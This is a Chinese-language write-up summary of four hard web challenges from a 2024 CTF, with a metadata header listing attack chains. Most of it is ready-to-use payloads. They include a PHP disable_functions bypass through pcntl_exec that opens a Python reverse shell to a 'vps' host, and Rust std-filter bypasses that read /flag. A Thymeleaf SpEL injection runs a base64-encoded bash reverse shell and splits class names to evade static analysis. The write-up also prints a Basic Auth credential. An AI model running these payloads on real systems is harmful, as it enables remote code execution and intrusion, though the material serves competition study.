---
title: 第四届红明谷杯卫星应用数据安全大赛 WEB writeup
contest: 红明谷杯
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [Web-PHP-Filter链,oracle文件读取,匿名类anonymous,pcntl_exec绕disable_function,Rust-std过滤+include!+FFI,Rust内联externC,SpringBoot-ThymeleafSSTI,Log4j-LoaderUtil,SSRF/curl+跳板,Java外部类]
attack_chain: PHP-Filter链: synacktiv/php_filter_chains_oracle_exploit工具跑出flag.php|匿名类: ?ezphpPhp8=class@anonymous\0/var/www/html/flag.php:7$0 调getflag|disable_function: Basic Auth admin/2e525e29e465f45d8d7c56319fe73036+@eval($_GET['cmd'])+pcntl_exec python反弹|Rust: 过滤std→include!("/flag")或extern "C" fn system+unsafe{Spring Boot curl+getsites: SSRF/curl下载vps+hostname SpelExpressionParser+Log4j LoaderUtil调Runtime.exec反弹
key_payload: ?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0|pcntl_exec("/usr/bin/python",array('-c','import socket,subprocess,os;s=socket.socket(...);s.connect(...);os.dup2(s.fileno(),0,1,2);p=subprocess.call(["/bin/bash","-i"])'))|fn main() { include!("/flag"); }|extern "C" { fn system(cmd: *const u8) -> i32; } unsafe { system("cat /flag".as_ptr()); }|T(org.thymeleaf.util.ClassLoaderUtils).loadClass('org.apa'+'che.logging.log4j.util.LoaderUtil').newInstanceOf('org.spr'+'ingframework.expression.spel.standard.SpelExpressionParser').parseExpression('T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLjAuMC4wLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}")').getValue()
one_liner: 第四届红明谷杯卫星应用WEB 4题:PHP-Filter链oracle读源(synacktiv工具)+匿名类anonymous\0/var/www/html/flag.php:7$0+pcntl_exec反弹shell+Rust-std过滤用include!("/flag")或extern C system+Spring Boot/curl SSRF跳板/Log4j LoaderUtil调SpelExpressionParser反弹
lesson: 1) PHP-Filter链 oracle攻击:synacktiv工具可基于错误状态oracle盲读任意文件; 2) PHP匿名类引用:`class@anonymous\0/path/file.php:line$idx`; 3) disable_function绕:pcntl_exec调python反弹shell (subprocess+os.dup2); 4) Rust std过滤:include!("/flag") 或 FFI extern "C" unsafe { system(...) }; 5) Spring Boot Thymeleaf SpEL RCE:`[[${T(...).parseExpression('T(java.lang.Runtime).getRuntime().exec(...)').getValue()}]]`; 6) Java外部类字符串拼接:'org.apa'+'che.logging.log4j.util.LoaderUtil' 绕静态分析; 7) curl+SSRF跳板:public vps→/curl?url→hostname 跳本地127.0.0.1
quality: high
---

## 备注

原文(https://www.ctfiot.com/173339.html)2024年4月第四届红明谷杯卫星应用数据安全大赛WEB,包含多方向高难度技术。

### 题目详情

**1) PHP-Filter链 oracle文件读取**
- 参考:https://xz.aliyun.com/t/12939
- 工具:https://github.com/synacktiv/php_filter_chains_oracle_exploit
- 源码:`<?php highlight_file(__FILE__); // flag.php if (isset($_POST['f'])) { echo hash_file('md5', $_POST['f']); }?>`
- 攻击:基于hash_file报错差异,oracle盲读flag.php

**2) 匿名类 (PHP 8)**
```php
<?php
if (isset($_GET['ezphpPhp8'])) {
    highlight_file(__FILE__);
} else {
    die("No");
}
$a = new class {
    function __construct() { }
    function getflag() { system('cat /flag'); }
};
unset($a);
$a = $_GET['ezphpPhp8'];
$f = new $a();
$f->getflag();
```
- 攻击:`?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0`

**3) disable_function绕**
- www.zip泄露源码
- Basic Auth:admin/2e525e29e465f45d8d7c56319fe73036
- @eval($_GET['cmd'])但ban了system
- pcntl_exec反弹:
```php
pcntl_exec("/usr/bin/python", array('-c', 'import socket,subprocess,os;s=socket.socket(...);s.connect(("vps",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])'));
```

**4) Rust std过滤**
- 源码:
```rust
#[post("/rust_code", data = "<code>")]
fn run_rust_code(code: String) -> String {
    if code.contains("std") {
        return "Error: std is not allowed".to_string();
    }
    // ...
}
```
- 绕法1:`fn main() { include!("/flag"); }`
- 绕法2:FFI
```rust
extern "C" { fn system(cmd: *const u8) -> i32; }
fn main() { unsafe { system("cat /flag".as_ptr()); } }
```

**5) Spring Boot Thymeleaf SpEL RCE (RealWorld CTF 6 chatterbox)**
- /curl+SSRF跳本地/AdminController getsites(只127.0.0.1访问)
- Thymeleaf SSTI:`[[${...}]]`
- 字符串拼接绕静态分析:'org.apa'+'che.logging.log4j.util.LoaderUtil'
- payload:
```java
T(org.thymeleaf.util.ClassLoaderUtils).loadClass(
    'org.apa'+'che.logging.log4j.util.LoaderUtil'
).newInstanceOf(
    'org.spr'+'ingframework.expression.spel.standard.SpelExpressionParser'
).parseExpression(
    'T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLjAuMC4wLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}")'
).getValue()
```

## 评级

- **quality: high** — 4+题WEB高难度,PHP-Filter链 oracle + 匿名类 + pcntl_exec反弹 + Rust std过滤 + Thymeleaf SSTI + SpEL RCE 全套
- **vuln_type: web_unknown** — 多方向高难度WEB
- 实战价值:PHP-Filter oracle+Rust FFI+Thymeleaf SpEL是2024年新兴CTF考点
